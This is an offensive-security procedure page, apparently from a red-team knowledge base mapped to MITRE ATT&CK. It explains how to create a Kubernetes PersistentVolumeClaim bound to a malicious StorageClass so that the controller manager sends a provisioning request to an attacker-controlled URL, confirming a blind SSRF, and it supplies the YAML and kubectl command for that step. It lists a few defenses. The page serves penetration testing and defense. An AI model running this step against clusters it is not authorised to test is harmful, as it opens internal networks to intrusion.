---
id: proc-k8s-trigger-pvc
tags:
  - ssrf
  - kubernetes
  - pvc
type: procedure
tools:
  - '[[tools/kubectl]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/kubectl-create-yaml]]'
verified: false
platforms:
  - Kubernetes
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:08:54.847Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
---

# Trigger-SSRF-with-PersistentVolumeClaim

## Summary

This procedure creates a PersistentVolumeClaim (PVC) bound to the malicious StorageClass, triggering the kube-controller-manager to send a provisioning POST request to the attacker-controlled URL, confirming half-blind SSRF.

## Description

Once a StorageClass is defined, requesting a PVC initiates dynamic provisioning. The controller sends internal requests to the provisioner endpoint, which is SSRF-vulnerable due to the manipulated resturl. This works in managed Kubernetes where the master nodes have internal network access.

## Requirements

1. Malicious StorageClass already created
2. kubectl access to create PVCs
3. Attacker server listening on specified port

## Defense

Defensive measures and detection strategies:

- Audit PVC creations for suspicious storageClassNames
- Restrict provisioning to trusted provisioners
- Enable RBAC to limit StorageClass creation

## Objectives

1. Initiate provisioning to exploit SSRF
2. Send POST request from internal cluster
3. Verify request arrival at attacker endpoint

## Instructions

### Step 1: Prepare PVC YAML

**Context**: Define PVC YAML referencing the malicious StorageClass.

**Command** ([[commands/kubectl-create-yaml]]):
```bash
# Example pvc-poc.yaml:
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: poc-pvc
spec:
  accessModes:
    - ReadWriteOnce
  volumeMode: Filesystem
  resources:
    requests:
      storage: 8Gi
  storageClassName: poc-ssrf
```

> This requests 8Gi storage, triggering provisioning.

### Step 2: Create PVC

**Context**: Apply to start the SSRF request.

**Command** ([[commands/kubectl-create-yaml]]):
```bash
kubectl create -f pvc-poc.yaml
```

> Expected output: pvc/poc-pvc created. Check status with `kubectl get pvc` (Pending).

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/kubectl-create-yaml]]

## Tools Used

- [[tools/kubectl]]

## Tags

- ssrf
- kubernetes
- pvc

---
